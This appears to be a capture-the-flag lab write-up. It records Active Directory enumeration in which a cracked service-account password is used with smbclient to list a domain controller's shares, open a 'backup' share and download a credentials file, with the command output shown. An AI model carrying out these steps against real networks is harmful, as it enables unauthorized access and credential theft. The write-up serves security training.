# Enumeration Part 2
- Cracked a user account credentials, now we have more access within domain
- Enumerate shares that the domain controller may be managing

<pre>smbclient -L 10.10.231.15 -U svc-admin  

Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.231.15 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
</pre>

- Connect to share
<pre>smbclient \\\\10.10.231.15\\backup -U svc-admin</pre>

<pre>smb: \>ls  
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020  

smb: \get backupcredentials.txt

getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)</pre>

- Downloaded backup_credentials.txt using `get` command in smb